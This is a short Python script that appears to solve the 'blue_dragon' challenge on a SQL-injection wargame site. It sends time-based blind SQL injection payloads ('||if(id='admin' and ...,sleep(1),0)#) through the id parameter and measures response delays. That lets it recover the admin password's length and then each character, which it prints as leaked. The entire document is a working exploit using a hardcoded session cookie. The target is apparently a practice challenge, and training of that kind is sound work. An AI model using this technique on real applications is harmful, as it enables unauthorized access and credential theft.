#!/usr/bin/env python3
# coding: utf-8

import requests
import time
import string

headers = {
    'Cookie': 'PHPSESSID=6b28r4o43epapipkuj2n3oposs',
}


def is_true(query):
    before = time.time()
    url = "https://los.rubiya.kr/chall/blue_dragon_23f2e3c81dca66e496c7de2d63b82984.php?id='||if(id='admin' and {0},sleep(1),0)%23".format(query)
    r = requests.get(url, headers=headers)
    after = time.time()
    if after - before >= 1:
        return True
    return False


def get_password_length():
    length = 0
    while True:
        query = "length(pw)={0}".format(length)
        if is_true(query):
            return length
        length += 1


def guess_char(location):
    for c in string.printable:
        query = "ord(mid(pw,{0},1))={1}".format(location, ord(c))
        if is_true(query):
            return c


def get_password():
    length = get_password_length()
    password = ''
    for i in range(1, length + 1):
        password += guess_char(i)
        print('[*] leaked password :', password)
    return password


def main():
    print('[*] password :', get_password())


if __name__ == '__main__':
    main()

